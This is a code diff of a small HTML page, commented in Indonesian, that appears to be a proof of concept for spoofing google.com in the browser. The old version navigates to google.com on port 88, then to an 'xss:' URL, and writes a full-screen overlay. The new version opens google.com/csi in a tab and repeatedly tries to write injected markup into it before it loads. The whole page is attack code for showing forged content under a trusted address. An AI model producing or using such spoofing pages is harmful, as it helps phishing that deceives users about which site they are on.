@@ -1,31 +1,23 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>google.com</title>
-</head>
 <body>
-
-<center>
-  <button id="img" onclick="a()">Click me</button>
-  <div id="kata" style="display:none">Loading...</div>
-</center>
+<button onclick="a()">Click me</button>
 
 <script>
 function a() {
-  // Sama persis seperti script Apple
-  // tapi target google.com
-  location = "http://www.google.com:88"
+  // Step 1 - Buka google.com/csi langsung
+  const tab = window.open(
+    "https://www.google.com/csi", "_blank"
+  );
   
-  document.getElementById("img").style.display = "none";
-  document.getElementById("kata").style.display = "block";
+  if (!tab) { alert("Blocked!"); return; }
 
-  setTimeout(() => {
-    location.replace('xss:')
-    
-    document.getElementById("kata").style.display = "none";
-
-    setTimeout(() => {
-      document.write(`
+  // Step 2 - Inject SANGAT cepat
+  // sebelum google.com selesai load
+  const tryInject = (attempt) => {
+    try {
+      // Coba tulis ke tab
+      tab.document.write(`
         <div style="
           position:fixed;
           inset:0;
@@ -52,11 +44,20 @@ function a() {
           </div>
         </div>
       `);
-    }, 500);
+      tab.document.close();
+      console.log('Success at attempt:', attempt);
+    } catch(e) {
+      console.warn('Attempt', attempt, ':', e.message);
+      // Coba lagi kalau gagal
+      if (attempt < 20) {
+        setTimeout(() => tryInject(attempt + 1), 50);
+      }
+    }
+  };
 
-  }, 4000);
+  // Mulai coba dari 0ms
+  tryInject(0);
 }
 </script>
-
 </body>
 </html>
